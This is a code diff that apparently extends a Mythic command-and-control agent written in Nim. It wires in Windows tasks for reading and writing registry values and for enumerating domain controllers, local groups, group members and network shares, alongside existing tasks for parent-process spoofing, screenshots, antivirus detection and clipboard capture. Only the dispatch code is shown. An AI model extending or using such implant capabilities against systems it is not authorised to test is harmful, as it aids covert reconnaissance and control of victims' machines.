@@ -44,6 +44,12 @@ when defined(windows):
   import tasks/spawnto_x64
   import tasks/spawnto_x86
   import tasks/ppid
+  import tasks/reg_query
+  import tasks/reg_write_value
+  import tasks/net_dclist
+  import tasks/net_localgroup
+  import tasks/net_localgroup_member
+  import tasks/net_shares
   import tasks/screenshot
   import tasks/get_av
   import tasks/clipboard
@@ -652,6 +658,54 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
           response = ppid(taskId, params)
         else:
           response = mythicError(taskId, "ppid is only available on Windows")
+      
+      of "reg_query":
+        when defined(windows):
+          if agent.config.debug:
+            echo "[DEBUG] Executing reg_query command"
+          response = regQuery(taskId, params)
+        else:
+          response = mythicError(taskId, "reg_query is only available on Windows")
+      
+      of "reg_write_value":
+        when defined(windows):
+          if agent.config.debug:
+            echo "[DEBUG] Executing reg_write_value command"
+          response = regWriteValue(taskId, params)
+        else:
+          response = mythicError(taskId, "reg_write_value is only available on Windows")
+      
+      of "net_dclist":
+        when defined(windows):
+          if agent.config.debug:
+            echo "[DEBUG] Executing net_dclist command"
+          response = netDclist(taskId, params)
+        else:
+          response = mythicError(taskId, "net_dclist is only available on Windows")
+      
+      of "net_localgroup":
+        when defined(windows):
+          if agent.config.debug:
+            echo "[DEBUG] Executing net_localgroup command"
+          response = netLocalgroup(taskId, params)
+        else:
+          response = mythicError(taskId, "net_localgroup is only available on Windows")
+      
+      of "net_localgroup_member":
+        when defined(windows):
+          if agent.config.debug:
+            echo "[DEBUG] Executing net_localgroup_member command"
+          response = netLocalgroupMember(taskId, params)
+        else:
+          response = mythicError(taskId, "net_localgroup_member is only available on Windows")
+      
+      of "net_shares":
+        when defined(windows):
+          if agent.config.debug:
+            echo "[DEBUG] Executing net_shares command"
+          response = netShares(taskId, params)
+        else:
+          response = mythicError(taskId, "net_shares is only available on Windows")
       
       of "get_av":
         when defined(windows):
